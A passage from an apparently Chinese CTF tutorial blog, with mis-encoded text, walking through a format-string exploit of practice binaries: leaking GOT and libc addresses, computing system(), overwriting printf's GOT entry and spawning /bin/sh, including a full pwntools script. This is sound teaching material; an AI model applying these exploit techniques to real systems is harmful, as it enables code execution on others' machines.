id="åˆ©ç”¨-libc-åç§»è®¡ç®—-system-åœ°å€"><a href="#åˆ©ç”¨-libc-åç§»è®¡ç®—-system-åœ°å€" class="headerlink" title="åˆ©ç”¨ libc åç§»è®¡ç®— system åœ°å€"></a>åˆ©ç”¨ libc åç§»è®¡ç®— system åœ°å€</h2><p>æ¥ä¸‹æ¥è¿˜éœ€è¦çŸ¥é“ <code>system()</code> çš„çœŸå®åœ°å€ï¼Œä½†æ˜¯ç¨‹åºä¸­å¹¶æ²¡æœ‰ä½¿ç”¨ <code>system()</code>ï¼Œå› æ­¤åªèƒ½é€šè¿‡ libc åç§»æ¥è®¡ç®—ï¼Œè¿™æ ·å°±éœ€è¦çŸ¥é“ <code>puts()</code> æˆ–è€… <code>printf()</code> å…¶ä¸€çš„çœŸå®åœ°å€ï¼ˆè¿™äº›å‡½æ•°çš„å®ç°æ¥è‡ªäº libcï¼Œç¨‹åºåªè´Ÿè´£è°ƒç”¨ï¼‰</p><p>ä»¥ <code>puts()</code> ä¸ºä¾‹ï¼š</p><p>ç”±äºæˆ‘ä»¬å·²ç»å¾—åˆ°äº† <code>puts_got_addr</code>ï¼Œè¯¥ GOT è¡¨åœ°å€ä¸Šå­˜æ”¾çš„å°±æ˜¯çœŸå®çš„ <code>puts_addr</code>ï¼Œå› æ­¤åªéœ€è¦å°† <code>puts_got_addr</code> è¿™ä¸ªåœ°å€ä¸Šçš„å€¼æ³„éœ²å‡ºæ¥å³å¯</p><p>é€šè¿‡å‰é¢çš„åˆ†æå·²ç»çŸ¥é“ï¼Œæˆ‘ä»¬è¾“å…¥çš„å†…å®¹åœ¨ç¬¬ 7 ä¸ªä½ç½®ï¼Œäºæ˜¯æ„é€ ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>puts_got_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'%7$s'</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_12.png" alt="ä½ æƒ³æœ‰å¤šPWN-fmt_test2_12.png"></p><p>æ¥æ”¶çš„æ•°æ®ä¸­ï¼Œå‰é¢çš„ 4 å­—èŠ‚ <code>18 50 93 61</code> å³æ˜¯ <code>p32(puts_got_addr)</code> çš„åœ°å€ï¼ˆå°ç«¯åºï¼‰ï¼Œç´§éšå…¶åçš„ 4 å­—èŠ‚å°±æ˜¯ <code>b&#39;%7$s&#39;</code> æ³„éœ²å‡ºçš„ <code>puts_addr</code>ï¼ˆå°ç«¯åºï¼‰</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"puts_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ç„¶åï¼Œåˆ©ç”¨çœŸå®åœ°å€ <code>puts_addr</code> è®¡ç®— libc åç§»ï¼Œå¾—åˆ° <code>system()</code> çš„çœŸå®åœ°å€</p><h3 id="åœ¨æœ¬åœ°ä¸ä½¿ç”¨-LibcSearcher-çš„æ–¹æ³•"><a href="#åœ¨æœ¬åœ°ä¸ä½¿ç”¨-LibcSearcher-çš„æ–¹æ³•" class="headerlink" title="åœ¨æœ¬åœ°ä¸ä½¿ç”¨ LibcSearcher çš„æ–¹æ³•"></a>åœ¨æœ¬åœ°ä¸ä½¿ç”¨ LibcSearcher çš„æ–¹æ³•</h3><p>é¦–å…ˆä½¿ç”¨ ldd ç¡®å®šç¨‹åºçš„ libc ç‰ˆæœ¬ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ldd fmt_str_level_1_x86<span class="token comment"># è¾“å‡ºä¸ºï¼š</span><span class="token comment">#   linux-gate.so.1 (0xed54e000)</span><span class="token comment"># libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xed200000)</span><span class="token comment"># /lib/ld-linux.so.2 (0xed550000)</span><span class="token comment"># å› æ­¤ libc ä¸º /lib/i386-linux-gnu/libc.so.6</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åˆ©ç”¨åç§»è®¡ç®—ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/i386-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>libcbase <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>bin_sh_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>æ¯è®¡ç®—ä¸€æ­¥è·å–åˆ°çš„å€¼ï¼Œéƒ½è®°å¾—è°ƒè¯•ä¸€ä¸‹è¿›è¡ŒéªŒè¯ï¼Œçœ‹çœ‹ç»“æœæ˜¯ä¸æ˜¯æ­£ç¡®çš„</p></blockquote><p>å¯ä»¥çœ‹åˆ° <code>system()</code> åœ°å€æ²¡æœ‰é—®é¢˜ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_13.png" alt="ä½ æƒ³æœ‰å¤šPWN-fmt_test2_13.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_14.png" alt="ä½ æƒ³æœ‰å¤šPWN-fmt_test2_14.png"></p><h3 id="åˆ©ç”¨-glibc-all-in-one-çš„æ–¹æ³•"><a href="#åˆ©ç”¨-glibc-all-in-one-çš„æ–¹æ³•" class="headerlink" title="åˆ©ç”¨ glibc-all-in-one çš„æ–¹æ³•"></a>åˆ©ç”¨ glibc-all-in-one çš„æ–¹æ³•</h3><blockquote><p>ç”±äºæˆ‘ç›´æ¥ä½¿ç”¨ LibcSearcher æ‰¾åˆ°çš„ libc åç§»è®¡ç®—å‡ºæ¥çš„ <code>system()</code> åœ°å€éƒ½ä¸å¯¹ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">obj <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">"puts"</span><span class="token punctuation">,</span> puts_addr<span class="token punctuation">)</span><span class="token comment"># obj = LibcSearcher("__GI__IO_puts", puts_addr)</span>libcbase <span class="token operator">=</span> puts_addr <span class="token operator">-</span> obj<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span> <span class="token comment"># è®¡ç®—åç§»é‡</span><span class="token comment"># libcbase = puts_addr - obj.dump('__GI__IO_puts') # è®¡ç®—åç§»é‡</span>system_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> obj<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span> <span class="token comment"># è®¡ç®—ç¨‹åºä¸­ system() çš„çœŸå®åœ°å€  </span>bin_sh_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> obj<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span> <span class="token comment"># è®¡ç®—ç¨‹åºä¸­'/bin/sh'çš„çœŸå®åœ°å€</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰€ä»¥è¿™é‡Œé€šè¿‡åœ¨çº¿ç½‘ç«™æŸ¥æ‰¾ï¼š<a href="https://libc.blukat.me/">libc database search</a></p></blockquote><p>ä¸ºäº†æ›´ç²¾ç¡®çš„æŸ¥æ‰¾ï¼Œå¤šåŠ å‡ ä¸ªé™åˆ¶æ¡ä»¶</p><p>åˆšåˆšé€šè¿‡è°ƒè¯•æˆ‘ä»¬çŸ¥é“ï¼š<code>puts()</code> çš„æœ€ä½ä¸‰ä½ä¸º <code>0x2a0</code>ï¼Œ<code>system()</code> æœ€ä½ä¸‰ä½ä¸º <code>0x170</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_16.png" alt="ä½ æƒ³æœ‰å¤šPWN-fmt_test2_16.png"></p><p>ç„¶å <code>b&#39;/bin/sh&#39;</code> æœ€ä½ä¸‰ä½ä¸º <code>0x0d5</code></p><p><strong>å³ä½¿åœ°å€æ˜¯éšæœºçš„ï¼Œä½†æ˜¯æœ€ä½ä¸‰ä½æ˜¯ä¸å˜çš„</strong>ï¼Œå› æ­¤æœç´¢ä¸€ä¸‹ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_17.png" alt="ä½ æƒ³æœ‰å¤šPWN-fmt_test2_17.png"></p><p>æœ‰ä¸‰ä¸ª libc æ»¡è¶³æ¡ä»¶ï¼Œæˆ‘è¿™é‡Œé€‰æ‹© <code>libc6_2.35-0ubuntu3.7_i386</code></p><p>ç„¶åä½¿ç”¨ glibc-all-in-one ä¸‹è½½å¯¹åº”ç‰ˆæœ¬çš„ libcï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_18.png" alt="ä½ æƒ³æœ‰å¤šPWN-fmt_test2_18.png"></p><p>ç„¶åå°† libc è·¯å¾„æ›´æ”¹ä¸ºï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/opt/glibc-all-in-one/libs/2.35-0ubuntu3.7_i386/libc.so.6'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p><em>å…³äºå¦‚ä½•ä½¿ç”¨ glibc-all-in-one è¯¦è§ã€ŠPwntoolsä¸expæŠ€å·§ã€‹ä¸€æ–‡</em></p></blockquote><h2 id="ä½¿ç”¨-fmtstr-payload-ä¿®æ”¹-GOT-è¡¨"><a href="#ä½¿ç”¨-fmtstr-payload-ä¿®æ”¹-GOT-è¡¨" class="headerlink" title="ä½¿ç”¨ fmtstr_payload ä¿®æ”¹ GOT è¡¨"></a>ä½¿ç”¨ fmtstr_payload ä¿®æ”¹ GOT è¡¨</h2><p>æœ€åï¼Œåˆ©ç”¨ <code>fmtstr_payload()</code> æ„é€ æ ¼å¼åŒ–å­—ç¬¦ä¸²åˆ©ç”¨ï¼Œå°† <code>printf_got_addr</code> ä¿®æ”¹ä¸º <code>system_plt</code> åœ°å€å³å¯</p><p>æ ¹æ®è¾“å…¥çš„æ•°æ®ä½äºç¬¬ 7 ä¸ªä½ç½®ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload_write_printf_got <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>printf_got_addr<span class="token punctuation">:</span> system_addr<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload_write_printf_got<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å‘ <code>printf()</code> ä¼ é€’å‚æ•° <code>b&#39;/bin/sh&#39;</code> å³å¯æ„é€  <code>system(&quot;/bin/sh&quot;)</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="å®Œæ•´è„šæœ¬"><a href="#å®Œæ•´è„šæœ¬" class="headerlink" title="å®Œæ•´è„šæœ¬"></a>å®Œæ•´è„šæœ¬</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># è®¾ç½®ç³»ç»Ÿæ¶æ„, æ‰“å°è°ƒè¯•ä¿¡æ¯</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># PWN è¿œç¨‹ : content = 0, PWN æœ¬åœ° : content = 1</span>content <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token comment"># å°†æœ¬åœ°çš„ Linux ç¨‹åºå¯åŠ¨ä¸ºè¿›ç¨‹ io</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./fmt_str_level_1_x86"</span><span class="token punctuation">)</span><span class="token comment"># é™„åŠ  gdb è°ƒè¯•</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>cmd<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>    pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># æ³„éœ²å¹¶è®¡ç®— main å‡½æ•°çœŸå®åœ°å€</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'input:\n'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'%75$p'</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>ret_main_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ret_main_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>ret_main_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>main_addr <span class="token operator">=</span> ret_main_addr <span class="token operator">-</span> <span class="token number">30</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"main_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># æ ¹æ® main å‡½æ•°çš„çœŸå®åœ°å€è®¡ç®— puts å‡½æ•°çš„ GOT è¡¨åœ°å€</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./fmt_str_level_1_x86"</span><span class="token punctuation">)</span>main_puts_offset <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"main"</span><span class="token punctuation">]</span> <span class="token operator">-</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>puts_got_addr <span class="token operator">=</span> main_addr <span class="token operator">-</span> main_puts_offset<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"puts_got_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>puts_got_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># åˆ©ç”¨ puts å‡½æ•°çš„ GOT è¡¨åœ°å€æ³„éœ² puts å‡½æ•°çš„çœŸå®åœ°å€</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>puts_got_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'%7$s'</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"puts_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># æ ¹æ® puts å‡½æ•°çš„çœŸå®åœ°å€ä¸ libc åç§»è®¡ç®— system å‡½æ•°åœ°å€</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/i386-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span><span class="token comment"># libc = ELF('/opt/glibc-all-in-one/libs/2.35-0ubuntu3.7_i386/libc.so.6')</span>libcbase <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>bin_sh_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"libcbase -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libcbase<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"system_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"bin_sh_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># æ ¹æ® main å‡½æ•°çš„çœŸå®åœ°å€è®¡ç®— printf å‡½æ•°çš„ GOT è¡¨åœ°å€</span>main_printf_offset <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"main"</span><span class="token punctuation">]</span> <span class="token operator">-</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"printf"</span><span class="token punctuation">]</span>printf_got_addr <span class="token operator">=</span> main_addr <span class="token operator">-</span> main_printf_offset<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"printf_got_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>printf_got_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># åˆ©ç”¨ fmtstr_payload å°† printf å‡½æ•°çš„ GOT è¡¨åœ°å€æ”¹ä¸º system å‡½æ•°</span>payload_write_printf_got <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>printf_got_addr<span class="token punctuation">:</span> system_addr<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment"># debug()</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload_write_printf_got<span class="token punctuation">)</span><span class="token comment"># å‘ printf å‘é€ b'/bin/sh' æ„é€  system("/bin/sh")</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token comment"># ä¸è¿œç¨‹äº¤äº’</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ç»“æœ"><a href="#ç»“æœ" class="headerlink" title="ç»“æœ"></a>ç»“æœ</h2><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_15.png" alt="ä½ æƒ³æœ‰å¤šPWN-fmt_test2_15.png"></p><hr><h1 id="fmt-str-level-1-x64"><a href="#fmt-str-level-1-x64" class="headerlink" title="fmt_str_level_1_x64"></a>fmt_str_level_1_x64</h1><blockquote><p>ä¸»è¦åœ¨ <em>â€œå®šä½å¹¶æ³„éœ²æ ˆä¸­çš„æ•°æ®â€</em> å’Œ <em>â€œåˆ©ç”¨ libc åç§»è®¡ç®— system åœ°å€â€</em> ä¸¤èŠ‚ä¸­ä¸ 32 ä½ç¨‹åºæœ‰æ‰€åŒºåˆ«</p></blockquote><hr><h2 id="å®šä½å¹¶æ³„éœ²æ ˆä¸­çš„æ•°æ®-1"><a href="#å®šä½å¹¶æ³„éœ²æ ˆä¸­çš„æ•°æ®-1" class="headerlink" title="å®šä½å¹¶æ³„éœ²æ ˆä¸­çš„æ•°æ®"></a>å®šä½å¹¶æ³„éœ²æ ˆä¸­çš„æ•°æ®</h2><p>å‡†å¤‡å·¥ä½œä¸å‰é¢ä¸€æ ·ï¼Œå°±ä¸å†è¯¦ç»†è¯´æ˜äº†</p><p>é¦–å…ˆè°ƒè¯• <code>fmt_str_level_1_x64</code> ç¨‹åºï¼Œåœ¨ <code>read()</code> å¤„è¾“å…¥ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">aaaaaaaa_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æŸ¥çœ‹è¾“å‡ºï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_19.png" alt="ä½ æƒ³æœ‰å¤šPWN-fmt_test2_19.png"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">aaaaaaaa_0x55555555600b_0x71_0xffffffff_0x6_0x7ffff7fc9040_0x6161616161616161_0x255f70255f70255f_0x5f70255f70255f70_0x70255f70255f7025_0x255f70255f70255f_0xa70255f70_</span><span class="token punctuation">(</span>nil<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ° <code>0x6161616161616161</code> ä½äºç¬¬ 6 ä¸ªä½ç½®ï¼Œå³ RSP æ‰€æŒ‡å‘çš„ä½ç½®ï¼ˆ<mark>å› ä¸ºåœ¨ 64 ä½ç¨‹åºä¸­ printf å‡½æ•°çš„å‰ 6 ä¸ªå‚æ•°ä½äºå¯„å­˜å™¨ä¸­ï¼Œç¬¬ 7 ä¸ªå‚æ•°æ‰å¼€å§‹å…¥æ ˆï¼›è€Œ 32 ä½ç¨‹åº printf å‡½æ•°çš„å‚æ•°éƒ½å­˜æ”¾åœ¨æ ˆä¸­ï¼Œè¿™æ˜¯ 64 ä½ç¨‹åºä¸ 32 ä½ç¨‹åºä¸åŒçš„åœ°æ–¹</mark>ï¼‰</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_20.png" alt="ä½ æƒ³æœ‰å¤šPWN-fmt_test2_20.png"></p><p>ä¸ 32 ä½ç¨‹åºåŒç†ï¼Œè®¡ç®—å¯çŸ¥æ ˆä¸­çš„è¿”å›åœ°å€ä½äºï¼š<code>6 + (0x7fffffffdad8 - 0x7fffffffd9c0) / 8 = 6 + 35 = 41</code></p><p>æ„é€  <code>printf(%41$p)</code> å³å¯æ³„éœ²å‡º <code>main+28</code> çš„çœŸå®åœ°å€ï¼Œäºæ˜¯ <code>main()</code> çš„çœŸå®åœ°å€ä¸ºï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'input:\n'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'%41$p'</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>ret_main_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ret_main_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>ret_main_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>main_addr <span class="token operator">=</span> ret_main_addr <span class="token operator">-</span> <span class="token number">28</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"main_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="åˆ©ç”¨-ELF-çš„å‡½æ•°åç§»è®¡ç®—çœŸå®åœ°å€-1"><a href="#åˆ©ç”¨-ELF-çš„å‡½æ•°åç§»è®¡ç®—çœŸå®åœ°å€-1" class="headerlink" title="åˆ©ç”¨ ELF çš„å‡½æ•°åç§»è®¡ç®—çœŸå®åœ°å€"></a>åˆ©ç”¨ ELF çš„å‡½æ•°åç§»è®¡ç®—çœŸå®åœ°å€</h2><p>ä¸ 32 ä½ä¸€æ ·ï¼Œæ ¹æ® ELF çš„å‡½æ•°åç§»åœ°å€è®¡ç®— <code>puts_got_addr</code> å’Œ <code>printf_got_addr</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./fmt_str_level_1_x64"</span><span class="token punctuation">)</span>main_puts_offset <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"main"</span><span class="token punctuation">]</span> <span class="token operator">-</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>puts_got_addr <span class="token operator">=</span> main_addr <span class="token operator">-</span> main_puts_offset<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"puts_got_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>puts_got_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>main_printf_offset <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"main"</span><span class="token punctuation">]</span> <span class="token operator">-</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"printf"</span><span class="token punctuation">]</span>printf_got_addr <span class="token operator">=</span> main_addr <span class="token operator">-</span> main_printf_offset<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"printf_got_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>printf_got_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="åˆ©ç”¨-libc-åç§»è®¡ç®—-system-åœ°å€-1"><a 